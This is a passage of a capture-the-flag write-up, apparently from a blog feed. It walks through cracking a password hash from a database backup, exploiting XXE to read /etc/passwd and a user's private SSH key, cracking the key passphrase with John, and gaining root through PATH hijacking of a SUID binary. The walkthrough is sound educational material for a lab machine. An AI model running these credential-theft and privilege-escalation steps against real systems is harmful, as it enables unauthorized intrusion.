&lt;p&gt;&lt;code&gt;$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&amp;gt; .tables   users   sqlite&amp;gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png&#34; alt=&#34;&#34;  /&gt;

And we have our password! With the newfound credentials &lt;code&gt;admin:bulldog19&lt;/code&gt; I logged into the admin console on port 8765. Success! The credentials worked.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png&#34; alt=&#34;&#34;  /&gt;

While looking at the page source, two things immediately stand out to me.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I see a comment left by the developer&lt;/li&gt;
&lt;li&gt;The name of the input box is “xml”&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png&#34; alt=&#34;&#34;  /&gt;

When I try press submit without writing anything in the textarea, I am greeted by the following alert:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png&#34; alt=&#34;&#34;  /&gt;

Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the &lt;a href=&#34;https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870&#34;&gt;most common XML vulnerabilities&lt;/a&gt; is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this &lt;a href=&#34;https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/&#34;&gt;blog post&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;`&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;When I type this in the text area and press “Submit”, I see the following on my screen:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png&#34; alt=&#34;&#34;  /&gt;

Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.&lt;/p&gt;
&lt;h1 id=&#34;usertxt&#34;&gt;User.txt&lt;/h1&gt;
&lt;p&gt;Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed &lt;code&gt;/etc/passwd&lt;/code&gt; to &lt;code&gt;/home/barry/.ssh/id_rsa&lt;/code&gt; as &amp;ldquo;id_rsa&amp;rdquo; is a common name for the file containing a private ssh key.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png&#34; alt=&#34;&#34;  /&gt;

Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, &lt;strong&gt;making sure that there is no white space&lt;/strong&gt;. I changed the permissions on the file using this command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod 400 id_rsa_barry&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I went to ssh into the machine and this was my result:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png&#34; alt=&#34;&#34;  /&gt;

It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ python3 /usr/share/john/ssh2john.py id_rsa_barry &amp;gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png&#34; alt=&#34;&#34;  /&gt;

Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png&#34; alt=&#34;&#34;  /&gt;

Privilege Escalation&lt;/h1&gt;
&lt;p&gt;First, I took a look at Barry’s id.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It appears that he is not in any groups that we could use for privilege escalation. I also used &lt;code&gt;sudo -l&lt;/code&gt; to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;barry@mustacchio:~$ find / -perm -4000 2&amp;gt;/dev/null  
/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/snapd/snap-confine  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/bin/passwd  
/usr/bin/pkexec  
/usr/bin/chfn  
/usr/bin/newgrp  
/usr/bin/at  
/usr/bin/chsh  
/usr/bin/newgidmap  
/usr/bin/sudo  
/usr/bin/newuidmap  
/usr/bin/gpasswd  
**/home/joe/live\_log**  
/bin/ping  
/bin/ping6  
/bin/umount  
/bin/mount  
/bin/fusermount  
/bin/su
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ cd /home/joe &amp;amp;&amp;amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we do! When I run it, it appears to launch an application.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png&#34; alt=&#34;&#34;  /&gt;

This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the &lt;code&gt;strings&lt;/code&gt; command. Additionally, I used &lt;code&gt;awk&lt;/code&gt; so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings live_log | awk ‘length($0) &amp;gt; 15’&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png&#34; alt=&#34;&#34;  /&gt;

Interesting. There is a path to “access.log” and the full path for the &lt;code&gt;tail&lt;/code&gt; command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.&lt;/p&gt;
&lt;p&gt;`$ export PATH=/tmp&lt;br&gt;
$ cd /tmp&lt;br&gt;
$ echo “/bin/bash -p” &amp;gt; tail&lt;br&gt;
$ /bin/chmod +x tail&lt;br&gt;
$ /home/joe/live_log&lt;/p&gt;
&lt;h1 id=&#34;usrbinwhoami&#34;&gt;/usr/bin/whoami&lt;/h1&gt;
&lt;p&gt;root&lt;/p&gt;
&lt;h1 id=&#34;bincat-rootroottxt&#34;&gt;/bin/cat /root/root.txt&lt;/h1&gt;
&lt;p&gt;[REDACTED]`&lt;/p&gt;
&lt;p&gt;And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from &lt;code&gt;/usr/bin/tail&lt;/code&gt; to &lt;code&gt;/tmp/tail&lt;/code&gt; which allowed us to run &lt;code&gt;/bin/bash&lt;/code&gt; as root, giving us a root shell.&lt;/p&gt;
&lt;p&gt;That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt-5a02aa208/&#34;&gt;via LinkedIn&lt;/a&gt;. Thank you and take care!&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>
